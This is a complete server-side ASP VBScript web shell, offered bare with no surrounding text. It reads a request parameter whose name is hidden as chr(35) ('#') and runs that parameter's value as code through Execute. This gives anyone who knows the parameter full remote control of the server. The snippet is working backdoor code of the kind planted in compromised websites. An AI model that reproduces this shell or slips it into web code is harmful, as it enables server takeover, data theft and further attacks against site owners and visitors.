<script language=VBScript runat=server>if request(chr(35))<>"" then
response.clear
Execute request(chr(35))
response.end
end if
</script>
